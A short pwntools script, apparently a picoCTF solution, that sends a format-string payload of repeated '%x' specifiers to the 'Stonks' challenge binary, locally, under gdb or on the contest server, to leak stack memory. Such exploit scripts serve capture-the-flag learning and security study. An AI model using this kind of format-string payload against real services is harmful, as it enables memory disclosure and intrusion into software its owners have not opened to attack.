#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./vuln"
    #libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("mercury.picoctf.net", 53437)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
    		b *buy_stonks+411
    		c
    	"""
    	p = gdb.debug(chall,cmd)
    else:
        p = process(chall)

    payload = "%x" * 100

    p.sendlineafter('2)', '1')
    p.sendlineafter('token?', payload)

    p.interactive()
